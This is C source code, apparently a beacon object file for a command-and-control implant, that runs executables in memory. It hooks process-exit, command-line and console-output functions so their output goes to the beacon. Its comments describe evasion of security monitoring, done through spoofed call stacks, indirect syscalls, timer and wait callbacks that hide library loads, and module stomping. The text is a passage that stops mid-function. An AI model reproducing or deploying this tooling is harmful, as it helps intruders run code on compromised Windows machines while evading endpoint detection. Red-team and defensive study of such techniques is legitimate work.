#include <windows.h>

#include "Native.h"
#include "Vulcan.h"
#include "VxTable.h"
#include "Macros.h"
#include "Draugr.h"
#include "Beacon.h"
#include "Bofdefs.h"


VX_TABLE				VxTable;
SYNTHETIC_STACK_FRAME	SyntheticStackframe;

HANDLE      g_Heap      = NULL;
char*       g_ArgsA     = NULL;
wchar_t*    g_ArgsW     = NULL;
char**      ArgsCmdA    = NULL;
wchar_t**   ArgsCmdW    = NULL;
int         LenArg      = 0;


#ifdef _DEBUG
/**
 * @brief Convert proxy method enum to string for display
 * 
 * @param[in] method Proxy method value
 * @return Constant string representing the method
 */
const char* ProxyMethodToString(PROXY_METHOD method) {
    switch (method) {
        case PROXY_NONE:    return "None";
        case PROXY_DRAUGR:  return "Draugr";
        case PROXY_REGWAIT: return "Regwait";
        case PROXY_TIMER:   return "Timer";
        default:            return "Unknown";
    }
}

/**
 * @brief Convert allocation method enum to string for display
 * 
 * @param[in] method Allocation method value
 * @return Constant string representing the method
 */
const char* AllocationMethodToString(ALLOCATION_METHOD method) {
    switch (method) {
        case ALLOC_HEAP:        return "Heap";
        case ALLOC_VIRTUALALLOC: return "VirtualAlloc";
        case ALLOC_STOMPING:    return "Module Stomping";
        default:                return "Unknown";
    }
}
#endif

static char* WideToAnsi(const wchar_t* wstr)
{
    if (!wstr) return NULL;
    
    int len = WideCharToMultiByte(CP_UTF8, 0, wstr, -1, NULL, 0, NULL, NULL);
    if (len <= 0) return NULL;
    
    char* ansi = (char*)malloc(len);
    if (!ansi) return NULL;
    
    WideCharToMultiByte(CP_UTF8, 0, wstr, -1, ansi, len, NULL, NULL);
    return ansi;
}

/**
 * @brief Hook for GetCommandLineA
 */
char* Hook_GetCommandLineA()
{
	return g_ArgsA;
}

/**
 * @brief Hook for GetCommandLineW
 */
wchar_t* Hook_GetCommandLineW()
{
	return g_ArgsW;
}

/**
 * @brief Hook for __wgetmainargs
 */
int Hook___wgetmainargs(
	int* Argc,
	wchar_t*** Argv,
	wchar_t*** Env,
	int				SoWildCard,
	void* StartInfo
)
{
	*Argc = LenArg;
	*Argv = ArgsCmdW;

	return 0;
}

/**
 * @brief Hook for __getmainargs
 */
int Hook___getmainargs(
	int* Argc,
	char*** Argv,
	char*** Env,
	int			doWildCard,
	void* StartInfo
)
{
	*Argc = LenArg;
	*Argv = ArgsCmdA;

	return 0;
}

/**
 * @brief Hook for _pp__argv
 */
char*** Hook___p___argv()
{
	return &ArgsCmdA;
}

/**
 * @brief Hook for _pp__wargv
 */
wchar_t*** Hook___p___wargv()
{
	return &ArgsCmdW;
}

/**
 * @brief Hook for __p__argc
 */
int* Hook___p___argc()
{
	return &LenArg;
}

/**
 * @brief Hook for __onexit
 */
_onexit_t __cdecl Hook__onexit(_onexit_t function)
{
	return 0;
}

/**
 * @brief Hook for _atexit
 */
int __cdecl Hook_atexit(void(__cdecl* func)(void))
{
	return 0;
}

/**
 * @brief Hook for Exit
 */
int __cdecl Hook_Exit(int status)
{

	ExitThread(0);
	return 0;
}

/**
 * @brief Hook for ExitProcess
 */
void Hook_ExitProcess(UINT statuscode)
{
	ExitThread(0);
}

/**
 * @brief Hook for TerminateProcess
 */
BOOL Hook_TerminateProcess(HANDLE hProcess, UINT uExitCode)
{
	ExitThread(0);
}

/**
 * @brief Hook for __stdio_common_vfwprintf
 */
int __cdecl Hook__stdio_common_vfwprintf(
    unsigned __int64 const options,
    void* const stream,
    wchar_t const* const format,
    _locale_t const locale,
    va_list arglist)
{
    if (!format) return -1;
    
    wchar_t* buffer = (wchar_t*)malloc(PRINTF_BUFFER_SIZE * sizeof(wchar_t));
    if (!buffer) return -1;
    
    int result = _vsnwprintf_s(buffer, PRINTF_BUFFER_SIZE, _TRUNCATE, format, arglist);
    
    if (result > 0) {
        char* ansi = WideToAnsi(buffer);
        if (ansi) {
            BeaconPrintf(CALLBACK_OUTPUT, "%s", ansi);
            free(ansi);
        }
    }
    
    free(buffer);
    return result;
}

/**
 * @brief Hook for __stdio_common_vsprintf_s
 */
int __cdecl Hook__stdio_common_vsprintf_s(
    unsigned __int64 const options,
    char* const buffer,
    size_t const buffer_count,
    char const* const format,
    _locale_t const locale,
    va_list arglist)
{
    if (!format) return -1;
    
    char* temp_buffer = (char*)malloc(PRINTF_BUFFER_SIZE);
    if (!temp_buffer) return -1;
    
    int result = vsnprintf(temp_buffer, PRINTF_BUFFER_SIZE, format, arglist);
    
    if (result > 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "%s", temp_buffer);
        
        if (buffer && buffer_count > 0) {
            strncpy_s(buffer, buffer_count, temp_buffer, _TRUNCATE);
        }
    }
    
    free(temp_buffer);
    return result;
}

/**
 * @brief Hook for __stdio_common_vswprintf
 */
int __cdecl Hook__stdio_common_vswprintf(
    unsigned __int64 const options,
    wchar_t* const buffer,
    size_t const buffer_count,
    wchar_t const* const format,
    _locale_t const locale,
    va_list arglist)
{
    if (!format) return -1;
    
    wchar_t* temp_buffer = (wchar_t*)malloc(PRINTF_BUFFER_SIZE * sizeof(wchar_t));
    if (!temp_buffer) return -1;
    
    int result = _vsnwprintf_s(temp_buffer, PRINTF_BUFFER_SIZE, _TRUNCATE, format, arglist);
    
    if (result > 0) {
        char* ansi = WideToAnsi(temp_buffer);
        if (ansi) {
            BeaconPrintf(CALLBACK_OUTPUT, "%s", ansi);
            free(ansi);
        }
        
        if (buffer && buffer_count > 0) {
            wcsncpy_s(buffer, buffer_count, temp_buffer, _TRUNCATE);
        }
    }
    
    free(temp_buffer);
    return result;
}

/**
 * @brief Hook for __stdio_common_vswprintf_s
 */
int __cdecl Hook__stdio_common_vswprintf_s(
    unsigned __int64 const options,
    wchar_t* const buffer,
    size_t const buffer_count,
    wchar_t const* const format,
    _locale_t const locale,
    va_list arglist)
{
    if (!format) return -1;
    
    wchar_t* temp_buffer = (wchar_t*)malloc(PRINTF_BUFFER_SIZE * sizeof(wchar_t));
    if (!temp_buffer) return -1;
    
    int result = _vsnwprintf_s(temp_buffer, PRINTF_BUFFER_SIZE, _TRUNCATE, format, arglist);
    
    if (result > 0) {
        char* ansi = WideToAnsi(temp_buffer);
        if (ansi) {
            BeaconPrintf(CALLBACK_OUTPUT, "%s", ansi);
            free(ansi);
        }
        
        if (buffer && buffer_count > 0) {
            wcsncpy_s(buffer, buffer_count, temp_buffer, _TRUNCATE);
        }
    }
    
    free(temp_buffer);
    return result;
}

/**
 * @brief Hook for _snprintf
 */
int __cdecl Hook__snprintf(
    char* buffer,
    size_t count,
    const char* format,
    ...)
{
    if (!format) return -1;
    
    va_list args;
    va_start(args, format);
    
    char* temp_buffer = (char*)malloc(PRINTF_BUFFER_SIZE);
    if (!temp_buffer) {
        va_end(args);
        return -1;
    }
    
    int result = vsnprintf(temp_buffer, PRINTF_BUFFER_SIZE, format, args);
    va_end(args);
    
    if (result > 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "%s", temp_buffer);
        
        if (buffer && count > 0) {
            strncpy_s(buffer, count, temp_buffer, _TRUNCATE);
        }
    }
    
    free(temp_buffer);
    return result;
}

/**
 * @brief Hook for _vscprintf
 */
int __cdecl Hook__vscprintf(
    const char* format,
    va_list arglist)
{
    if (!format) return -1;
    
    char* temp_buffer = (char*)malloc(PRINTF_BUFFER_SIZE);
    if (!temp_buffer) return -1;
    
    int result = vsnprintf(temp_buffer, PRINTF_BUFFER_SIZE, format, arglist);
    
    if (result > 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "%s", temp_buffer);
    }
    
    free(temp_buffer);
    return result;
}

/**
 * @brief Hook for vfwprintf
 */
int __cdecl Hook_vfwprintf(
    void* stream,
    const wchar_t* format,
    va_list arglist)
{
    if (!format) return -1;
    
    wchar_t* buffer = (wchar_t*)malloc(PRINTF_BUFFER_SIZE * sizeof(wchar_t));
    if (!buffer) return -1;
    
    int result = _vsnwprintf_s(buffer, PRINTF_BUFFER_SIZE, _TRUNCATE, format, arglist);
    
    if (result > 0) {
        char* ansi = WideToAnsi(buffer);
        if (ansi) {
            BeaconPrintf(CALLBACK_OUTPUT, "%s", ansi);
            free(ansi);
        }
    }
    
    free(buffer);
    return result;
}

/**
 * @brief Hook for vwprintf
 */
int __cdecl Hook_vwprintf(
    const wchar_t* format,
    va_list arglist)
{
    if (!format) return -1;
    
    wchar_t* buffer = (wchar_t*)malloc(PRINTF_BUFFER_SIZE * sizeof(wchar_t));
    if (!buffer) return -1;
    
    int result = _vsnwprintf_s(buffer, PRINTF_BUFFER_SIZE, _TRUNCATE, format, arglist);
    
    if (result > 0) {
        char* ansi = WideToAnsi(buffer);
        if (ansi) {
            BeaconPrintf(CALLBACK_OUTPUT, "%s", ansi);
            free(ansi);
        }
    }
    
    free(buffer);
    return result;
}

/**
 * @brief Hook for wprintf
 */
int __cdecl Hook_wprintf(
    const wchar_t* format,
    ...)
{
    if (!format) return -1;
    
    va_list args;
    va_start(args, format);
    
    wchar_t* buffer = (wchar_t*)malloc(PRINTF_BUFFER_SIZE * sizeof(wchar_t));
    if (!buffer) {
        va_end(args);
        return -1;
    }
    
    int result = _vsnwprintf_s(buffer, PRINTF_BUFFER_SIZE, _TRUNCATE, format, args);
    va_end(args);
    
    if (result > 0) {
        char* ansi = WideToAnsi(buffer);
        if (ansi) {
            BeaconPrintf(CALLBACK_OUTPUT, "%s", ansi);
            free(ansi);
        }
    }
    
    free(buffer);
    return result;
}

/**
 * @brief Hook for __stdio_common_vfprintf (ANSI version)
 */
int __cdecl Hook__stdio_common_vfprintf(
    unsigned __int64 const options,
    void* const stream,
    char const* const format,
    _locale_t const locale,
    va_list arglist)
{
    if (!format) return -1;
    
    char* buffer = (char*)malloc(PRINTF_BUFFER_SIZE);
    if (!buffer) return -1;
    
    int result = vsnprintf(buffer, PRINTF_BUFFER_SIZE, format, arglist);
    
    if (result > 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "%s", buffer);
    }
    
    free(buffer);
    return result;
}

/**
 * @brief Hook for WriteConsoleA
 */
BOOL WINAPI Hook_WriteConsoleA(
    HANDLE hConsoleOutput,
    const VOID* lpBuffer,
    DWORD nNumberOfCharsToWrite,
    LPDWORD lpNumberOfCharsWritten,
    LPVOID lpReserved)
{
    if (!lpBuffer || nNumberOfCharsToWrite == 0) {
        if (lpNumberOfCharsWritten) {
            *lpNumberOfCharsWritten = 0;
        }
        return TRUE;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "%s", lpBuffer);
    if (lpNumberOfCharsWritten) {
        *lpNumberOfCharsWritten = nNumberOfCharsToWrite;
    }
    
    return TRUE;
}

/**
 * @brief Hook for WriteConsoleW
 */
BOOL WINAPI Hook_WriteConsoleW(
    HANDLE hConsoleOutput,
    const VOID* lpBuffer,
    DWORD nNumberOfCharsToWrite,
    LPDWORD lpNumberOfCharsWritten,
    LPVOID lpReserved)
{
    if (!lpBuffer || nNumberOfCharsToWrite == 0) {
        if (lpNumberOfCharsWritten) {
            *lpNumberOfCharsWritten = 0;
        }
        return TRUE;
    }
    
    BeaconPrintf(CALLBACK_OUTPUT, "%ws", lpBuffer);
            
    if (lpNumberOfCharsWritten) {
        *lpNumberOfCharsWritten = nNumberOfCharsToWrite;
    }
    
    return TRUE;
}

void* HookGetProcedureAddress(
	_In_	LPSTR lpProcedureName
)
{
	if (strcmp(lpProcedureName, "GetCommandLineA") == 0)
		return &Hook_GetCommandLineA;
	
	if (strcmp(lpProcedureName, "GetCommandLineW") == 0)
		return &Hook_GetCommandLineW;
	
	if (strcmp(lpProcedureName, "__wgetmainargs") == 0)
		return &Hook___wgetmainargs;
	
	if (strcmp(lpProcedureName, "__getmainargs") == 0)
		return &Hook___getmainargs;
	
	if (strcmp(lpProcedureName, "__p___argv") == 0)
		return &Hook___p___argv;

	if (strcmp(lpProcedureName, "__p___wargv") == 0)
		return &Hook___p___wargv;
	
	if (strcmp(lpProcedureName, "__p___argc") == 0)
		return &Hook___p___argc;
	
	if (strcmp(lpProcedureName, "_onexit") == 0)
		return &Hook__onexit;
	
	if (strcmp(lpProcedureName, "exit") == 0)
		return &Hook_Exit;
	
	if (strcmp(lpProcedureName, "_atexit") == 0)
		return &Hook_atexit;
	
	if (strcmp(lpProcedureName, "ExitProcess") == 0)
		return &Hook_ExitProcess;

    if (strcmp(lpProcedureName, "__stdio_common_vfprintf") == 0)
        return &Hook__stdio_common_vfprintf;  

    if (strcmp(lpProcedureName, "__stdio_common_vfwprintf") == 0)
        return &Hook__stdio_common_vfwprintf;
    
    if (strcmp(lpProcedureName, "__stdio_common_vsprintf_s") == 0)
        return &Hook__stdio_common_vsprintf_s;
    
    if (strcmp(lpProcedureName, "__stdio_common_vswprintf") == 0)
        return &Hook__stdio_common_vswprintf;
    
    if (strcmp(lpProcedureName, "__stdio_common_vswprintf_s") == 0)
        return &Hook__stdio_common_vswprintf_s;
   
    if (strcmp(lpProcedureName, "_snprintf") == 0) {
        return &Hook__snprintf;
    }
    if (strcmp(lpProcedureName, "_vscprintf") == 0) {
        return &Hook__vscprintf;
    }
    if (strcmp(lpProcedureName, "vfwprintf") == 0) {
        return &Hook_vfwprintf;
    }
    if (strcmp(lpProcedureName, "vwprintf") == 0)
        return &Hook_vwprintf;
    
    if (strcmp(lpProcedureName, "wprintf") == 0)
        return &Hook_wprintf;
   
    if (strcmp(lpProcedureName, "WriteConsoleA") == 0) 
        return &Hook_WriteConsoleA;
    
    if (strcmp(lpProcedureName, "WriteConsoleW") == 0) 
        return &Hook_WriteConsoleW;
            
	return NULL;
}


/**
 * @brief Custom memory copy implementation
 * @param Destination Destination buffer
 * @param Source Source buffer
 * @param Size Number of bytes to copy
 */
void _memcpy(
	_In_	PVOID	Destination,
	_In_	PVOID	Source,
	_In_	DWORD32	Size
)
{
	while (Size--)
		C_BYTE(Destination)[Size] = C_BYTE(Source)[Size];
}


/**
 * @brief Custom memory set implementation
 * @param Destination Destination buffer
 * @param Value Byte value to set
 * @param Size Number of bytes to set
 */
void _memset(
	_In_	PVOID	Destination,
	_In_	BYTE	Value,
	_In_	DWORD32	Size 
)
{
	while(Size--)
		C_BYTE(Destination)[Size] = Value;
}


/**
 * @brief Get length of wide string
 * @param Str Wide string to measure
 * @return Length of string (without null terminator)
 */
DWORD32 StrLenW(
	_In_ LPWSTR Str
)
{
    DWORD32 Counter = 0;
    while (Str[Counter] != 0x00) {
        Counter++;
    }
    return Counter;
}

/**
 * @brief Get length of ANSI string
 * @param Str ANSI string to measure
 * @return Length of string (without null terminator)
 */
DWORD32 StrLenA(
	_In_ LPSTR Str
)
{
    DWORD32 Counter = 0;
    while (Str[Counter] != 0x00) {
        Counter++;
    }
    return Counter;
}

/**
 * @brief Parse wide command line into argument array
 * @param ArgsW Wide command line string
 * @param ExeName Executable name for argv[0]
 * @param NbrOfArgs Output: number of arguments
 * @return Array of wide string arguments, or NULL on failure
 */
wchar_t** CmdLineToArgsW(
    _In_    wchar_t*    ArgsW,
    _In_    wchar_t*    ExeName,
    _Inout_ int*        NbrOfArgs
)
{
    if (!ArgsW || !NbrOfArgs || !ExeName)
        return NULL;

    *NbrOfArgs = 1;
    int len = StrLenW(ArgsW);
    BOOL inArg = FALSE;

    for (int i = 0; i < len; i++)
    {
        if (ArgsW[i] != L' ' && !inArg)
        {
            inArg = TRUE;
            (*NbrOfArgs)++;
        }
        else if (ArgsW[i] == L' ')
        {
            inArg = FALSE;
        }
    }

    wchar_t** ArgsLine = (wchar_t**)malloc(sizeof(wchar_t*) * (*NbrOfArgs));
    if (!ArgsLine)
        return NULL;

    int exeNameLen = StrLenW(ExeName);
    ArgsLine[0] = (wchar_t*)malloc(sizeof(wchar_t) * (exeNameLen + 1));
    if (!ArgsLine[0])
    {
        free(ArgsLine);
        return NULL;
    }
    _memcpy(ArgsLine[0], ExeName, sizeof(wchar_t) * (exeNameLen + 1));
    int argIndex = 1;
    int i = 0;

    while (i < len && argIndex < *NbrOfArgs)
    {
        while (i < len && ArgsW[i] == L' ')
            i++;

        if (i >= len)
            break;

        int start = i;
        while (i < len && ArgsW[i] != L' ')
            i++;

        int argLen = i - start;

        ArgsLine[argIndex] = (wchar_t*)malloc(sizeof(wchar_t) * (argLen + 1));
        if (!ArgsLine[argIndex])
        {
            for (int j = 0; j < argIndex; j++) {
                free(ArgsLine[j]);
            }
            free(ArgsLine);
            return NULL;
        }

        _memcpy(ArgsLine[argIndex], &ArgsW[start], sizeof(wchar_t) * argLen);
        ArgsLine[argIndex][argLen] = L'\0';
        argIndex++;
    }

    return ArgsLine;
}

/**
 * @brief Parse ANSI command line into argument array
 * @param ArgsA ANSI command line string
 * @param ExeName Executable name for argv[0]
 * @param NbrOfArgs Output: number of arguments
 * @return Array of ANSI string arguments, or NULL on failure
 */
char** CmdLineToArgsA(
    _In_    char*   ArgsA,
    _In_    char*   ExeName,
    _Inout_ int*    NbrOfArgs
)
{
    if (!ArgsA || !NbrOfArgs || !ExeName)
        return NULL;

    // Count arguments (start at 1 for argv[0])
    *NbrOfArgs = 1;
    int len = StrLenA(ArgsA);
    BOOL inArg = FALSE;

    for (int i = 0; i < len; i++)
    {
        if (ArgsA[i] != ' ' && !inArg)
        {
            inArg = TRUE;
            (*NbrOfArgs)++;
        }
        else if (ArgsA[i] == ' ')
        {
            inArg = FALSE;
        }
    }

    // Allocate array
    char** ArgsLine = (char**)malloc(sizeof(char*) * (*NbrOfArgs));
    if (!ArgsLine)
        return NULL;

    // Fill argv[0] with executable name
    int exeNameLen = StrLenA(ExeName);
    ArgsLine[0] = (char*)malloc(exeNameLen + 1);
    if (!ArgsLine[0])
    {
        free(ArgsLine);
        return NULL;
    }
    _memcpy(ArgsLine[0], ExeName, exeNameLen + 1);

    // Parse arguments starting at index 1
    int argIndex = 1;
    int i = 0;

    while (i < len && argIndex < *NbrOfArgs)
    {
        // Skip leading spaces
        while (i < len && ArgsA[i] == ' ')
            i++;

        if (i >= len)
            break;

        int start = i;

        // Find end of argument
        while (i < len && ArgsA[i] != ' ')
            i++;

        int argLen = i - start;

        // Allocate and copy argument
        ArgsLine[argIndex] = (char*)malloc(argLen + 1);
        if (!ArgsLine[argIndex])
        {
            // Cleanup on failure
            for (int j = 0; j < argIndex; j++) {
                free(ArgsLine[j]);
            }
            free(ArgsLine);
            return NULL;
        }

        _memcpy(ArgsLine[argIndex], &ArgsA[start], argLen);
        ArgsLine[argIndex][argLen] = '\0';
        argIndex++;
    }

    return ArgsLine;
}

/**
 * @brief Initialize global argument arrays from ANSI command line
 * @param ArgsA ANSI command line arguments
 * @param ExeNameA Executable name (ANSI)
 * @return TRUE on success, FALSE on failure
 */
BOOL InitArgs(
    _In_ char*  ArgsA,
    _In_ char*  ExeNameA
)
{
    if (!ArgsA || !ExeNameA)
    {
#ifdef _DEBUG
        BeaconPrintf(CALLBACK_ERROR, "[!] InitArgs: NULL parameters");
#endif
        return FALSE;
    }
    int ArgsSize = StrLenA(ArgsA);
    int ExeNameSize = StrLenA(ExeNameA);

    wchar_t* ArgsW = (wchar_t*)malloc((ArgsSize + 1) * sizeof(wchar_t));
    if (!ArgsW)
    {
#ifdef _DEBUG
        BeaconPrintf(CALLBACK_ERROR, "[!] InitArgs: malloc failed for ArgsW");
#endif
        return FALSE;
    }

    wchar_t* ExeNameW = (wchar_t*)malloc((ExeNameSize + 1) * sizeof(wchar_t));
    if (!ExeNameW)
    {
        free(ArgsW);
#ifdef _DEBUG
        BeaconPrintf(CALLBACK_ERROR, "[!] InitArgs: malloc failed for ExeNameW");
#endif
        return FALSE;
    }

    _memset(ArgsW, 0, (ArgsSize + 1) * sizeof(wchar_t));
    _memset(ExeNameW, 0, (ExeNameSize + 1) * sizeof(wchar_t));

    MultiByteToWideChar(CP_UTF8, 0, ArgsA, -1, ArgsW, ArgsSize + 1);
    MultiByteToWideChar(CP_UTF8, 0, ExeNameA, -1, ExeNameW, ExeNameSize + 1);

    g_ArgsA = ArgsA;
    g_ArgsW = ArgsW;

    int nbrOfArgsA = 0;
    int nbrOfArgsW = 0;

    ArgsCmdA = CmdLineToArgsA(ArgsA, ExeNameA, &nbrOfArgsA);
    ArgsCmdW = CmdLineToArgsW(ArgsW, ExeNameW, &nbrOfArgsW);

    free(ExeNameW);
    if (!ArgsCmdA || !ArgsCmdW)
    {
#ifdef _DEBUG
        BeaconPrintf(CALLBACK_ERROR, "[!] InitArgs: Failed to parse arguments");
#endif
        if (ArgsCmdA)
        {
            for (int i = 0; i < nbrOfArgsA; i++)
            {
                if (ArgsCmdA[i])
                    free(ArgsCmdA[i]);
            }
            free(ArgsCmdA);
            ArgsCmdA = NULL;
        }
        if (ArgsCmdW)
        {
            for (int i = 0; i < nbrOfArgsW; i++)
            {
                if (ArgsCmdW[i])
                    free(ArgsCmdW[i]);
            }
            free(ArgsCmdW);
            ArgsCmdW = NULL;
        }

        if (g_ArgsW)
        {
            free(g_ArgsW);
            g_ArgsW = NULL;
        }

        return FALSE;
    }

    if (nbrOfArgsA != nbrOfArgsW)
    {
        BeaconPrintf(CALLBACK_ERROR, "[!] InitArgs: Argument count mismatch (A=%d, W=%d)", nbrOfArgsA, nbrOfArgsW);

        if (ArgsCmdA)
        {
            for (int i = 0; i < nbrOfArgsA; i++)
            {
                if (ArgsCmdA[i])
                    free(ArgsCmdA[i]);
            }
            free(ArgsCmdA);
            ArgsCmdA = NULL;
        }
        if (ArgsCmdW)
        {
            for (int i = 0; i < nbrOfArgsW; i++)
            {
                if (ArgsCmdW[i])
                    free(ArgsCmdW[i]);
            }
            free(ArgsCmdW);
            ArgsCmdW = NULL;
        }
        if (g_ArgsW)
        {
            free(g_ArgsW);
            g_ArgsW = NULL;
        }

        return FALSE;
    }
    LenArg = nbrOfArgsA;

#ifdef _DEBUG
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Arguments initialized: %d args", LenArg);
    for (int i = 0; i < LenArg; i++)
    {
        BeaconPrintf(CALLBACK_OUTPUT, "    argv[%d] = %s", i, ArgsCmdA[i]);
    }
#endif
    return TRUE;
}

/**
 * @brief Convert milliseconds to LARGE_INTEGER for NtWaitForSingleObject
 * 
 * NtWaitForSingleObject uses 100-nanosecond intervals.
 * Negative values = relative timeout
 * Positive values = absolute time
 * 
 * @param dwMilliseconds Timeout in milliseconds (0 = no wait, INFINITE = -1)
 * @param pTimeout Output LARGE_INTEGER (in 100ns units)
 */
VOID MsToLargeInteger(
    _In_    DWORD           dwMilliseconds,
    _Out_   PLARGE_INTEGER  pTimeout
)
{
    _memset(pTimeout, 0, sizeof(LARGE_INTEGER));
    pTimeout->QuadPart = -( ((LONGLONG)dwMilliseconds) * 10000);
}

/**
 * @brief Loads a DLL module using various proxy execution methods for evasion
 * 
 * This function provides multiple techniques to load a library while avoiding
 * direct LoadLibraryA calls that might be monitored. It supports direct loading,
 * DRAUGR obfuscation, timer queue callbacks, and registered wait object callbacks.
 * 
 * @param lpModuleName Name of the module to load (e.g., "user32.dll")
 * @param Proxy The proxy method to use for loading (PROXY_NONE, PROXY_DRAUGR, 
 *              PROXY_TIMER, or PROXY_REGWAIT)
 * @param pHmodule Pointer to receive the loaded module handle
 * 
 * @return TRUE if the module was successfully loaded, FALSE otherwise
 * 
 * @note PROXY_TIMER and PROXY_REGWAIT methods execute LoadLibraryA asynchronously
 *       via callback mechanisms, providing additional evasion capabilities
 */
BOOL ProxyLoadLibraryA(
    _In_    LPSTR           lpModuleName,
    _In_    PROXY_METHOD    Proxy,
    _Inout_ HMODULE*        pHmodule
)
{
    HMODULE pKernel32 = GetModuleHandleA("Kernel32.dll");
    if (!pKernel32) {
#ifdef _DEBUG
        BeaconPrintf(CALLBACK_ERROR, "[!] Can't get Kernel32");
#endif
        return FALSE;
    }

    PVOID pLoadLibraryA = GetProcAddress(pKernel32, "LoadLibraryA");
    PVOID pGetModuleHandleA = GetProcAddress(pKernel32, "GetModuleHandleA");
    
    if (!pLoadLibraryA || !pGetModuleHandleA) {
#ifdef _DEBUG
        BeaconPrintf(CALLBACK_ERROR, "[!] Can't resolve required functions");
#endif
        return FALSE;
    }

    switch (Proxy)
    {
        case PROXY_NONE:
        {
            *pHmodule = DRAUGR_API(pLoadLibraryA, lpModuleName);
            if (!*pHmodule) {
#ifdef _DEBUG
                BeaconPrintf(CALLBACK_ERROR, "[!] LoadLibraryA failed for %s: Error %d", lpModuleName, GetLastError());
#endif
                return FALSE;  
            }
#ifdef _DEBUG
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Module loaded (NONE): %s at 0x%p",  lpModuleName, *pHmodule);
#endif
            return TRUE;
        }

        case PROXY_TIMER:
        {
            PVOID pCreateTimerQueue         = GetProcAddress(pKernel32, "CreateTimerQueue");
            PVOID pCreateTimerQueueTimer    = GetProcAddress(pKernel32, "CreateTimerQueueTimer");
            PVOID pDeleteTimerQueueEx       = GetProcAddress(pKernel32, "DeleteTimerQueueEx");

            if (!pCreateTimerQueue || !pCreateTimerQueueTimer || !pDeleteTimerQueueEx)
            {
                return FALSE;
            }

            HANDLE hTimerQueue = DRAUGR_API(pCreateTimerQueue, NULL);
            if (!hTimerQueue)
            {
                return FALSE;
            }

            HANDLE hNewTimer = NULL;

            if (!DRAUGR_API(pCreateTimerQueueTimer,
                            &hNewTimer,
                            hTimerQueue,
                            pLoadLibraryA,
                            lpModuleName,
                            100, 
                            0,   
                            WT_EXECUTEINTIMERTHREAD))
            {
                DRAUGR_API(pDeleteTimerQueueEx, hTimerQueue, NULL);
                return FALSE;
            }

            HANDLE hCompletionEvent = NULL;
            OBJECT_ATTRIBUTES objAttr;
            InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

            NTSTATUS Status = DRAUGR_SYSCALL(NtCreateEvent,
                                             &hCompletionEvent,
                                             EVENT_ALL_ACCESS,
                                             &objAttr,
                                             NotificationEvent,
                                             FALSE);

            if (!NT_SUCCESS(Status))
            {
                DRAUGR_API(pDeleteTimerQueueEx, hTimerQueue, NULL);
                return FALSE;
            }

            LARGE_INTEGER delay;
            MsToLargeInteger(500, &delay);
            DRAUGR_SYSCALL(NtWaitForSingleObject, hCompletionEvent, FALSE, &delay);

            DRAUGR_API(pDeleteTimerQueueEx, hTimerQueue, hCompletionEvent);

            if(hCompletionEvent) {
                DRAUGR_SYSCALL(NtClose, hCompletionEvent);
            }
            *pHmodule = DRAUGR_API(pGetModuleHandleA, lpModuleName);
            if (!*pHmodule)
            {
                return FALSE;
            }

            return TRUE;
        }

        case PROXY_REGWAIT:
        {
            PVOID pRegisterWaitForSingleObject  = GetProcAddress(pKernel32, "RegisterWaitForSingleObject");
            PVOID pUnregisterWait               = GetProcAddress(pKernel32, "UnregisterWait");
            
            if (!pRegisterWaitForSingleObject || !pUnregisterWait) {
#ifdef _DEBUG
                BeaconPrintf(CALLBACK_ERROR, "[!] Can't resolve RegisterWaitForSingleObject");
#endif
                return FALSE;
            }

            HANDLE hEvent = NULL;
            OBJECT_ATTRIBUTES objAttr;
            InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
            
            NTSTATUS Status = DRAUGR_SYSCALL(NtCreateEvent, &hEvent, EVENT_ALL_ACCESS, &objAttr, NotificationEvent, FALSE);
            if (NT_ERROR(Status)) {
#ifdef _DEBUG
                BeaconPrintf(CALLBACK_ERROR, "[!] NtCreateEvent failed: 0x%llx", Status);
#endif
                return FALSE;
            }

            HANDLE hNewWaitObject = NULL;
            if (!DRAUGR_API(pRegisterWaitForSingleObject, &hNewWaitObject, hEvent, pLoadLibraryA, lpModuleName, INFINITE, WT_EXECUTEONLYONCE))
            {
#ifdef _DEBUG
                BeaconPrintf(CALLBACK_ERROR, "[!] RegisterWaitForSingleObject failed: %d", GetLastError());
#endif
                DRAUGR_SYSCALL(NtClose, hEvent);
                return FALSE;
            }

            DRAUGR_SYSCALL(NtSetEvent, hEvent, NULL);

            LARGE_INTEGER delay;
            MsToLargeInteger(500, &delay);
            DRAUGR_SYSCALL(NtWaitForSingleObject, hEvent, FALSE, &delay);

            DRAUGR_API(pUnregisterWait, hNewWaitObject);
            DRAUGR_SYSCALL(NtClose, hEvent);

            *pHmodule = DRAUGR_API(pGetModuleHandleA, lpModuleName);
            if (!*pHmodule) {
#ifdef _DEBUG
                BeaconPrintf(CALLBACK_ERROR, "[!] Module %s not loaded after wait", lpModuleName);
#endif
                return FALSE;
            }

#ifdef _DEBUG
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Module loaded (REGWAIT): %s at 0x%p", lpModuleName, *pHmodule);
#endif
            return TRUE;
        }

        default:
#ifdef _DEBUG
            BeaconPrintf(CALLBACK_ERROR, "[!] Unknown proxy method: %d", Proxy);
#endif
            return FALSE;
    }
}

/**
 * @brief Allocates memory using different allocation strategies for evasion
 * 
 * This function provides multiple memory allocation techniques including heap
 * allocation, virtual memory allocation, and module stomping. The allocation
 * method is determined by the configuration structure.
 * 
 * @param dwSize Size of memory to allocate in bytes
 * @param Config Pointer to configuration structure containing allocation method
 *               and protection flags
 * 
 * @return Pointer to allocated memory on success, NULL on failure
 * 
 * @note ALLOC_STOMPING overwrites the .text section of a specified DLL loaded
 *       with DONT_RESOLVE_DLL_REFERENCES flag to avoid initialization
 * @note The function automatically adjusts memory protection based on Config->AllocRWX
 */
PVOID AllocateMemory(
    _In_    DWORD   dwSize,
    _In_    PCONFIG Config
)
{
    PVOID       pMemoryAddress  = NULL;
    NTSTATUS    Status          = 0;
    DWORD       dwMemProtect    = PAGE_READWRITE;
    ULONG       uOldProtect     = 0;
    SIZE_T      RegionSize      = 0;

    if (Config->AllocRWX) {
        dwMemProtect = PAGE_EXECUTE_READWRITE;
    }
    
    switch (Config->Allocation)
    {
        case ALLOC_HEAP:
        {
            HMODULE hNtdll = GetModuleHandleA("Ntdll.dll");

            if (!hNtdll)
            {
#ifdef _DEBUG
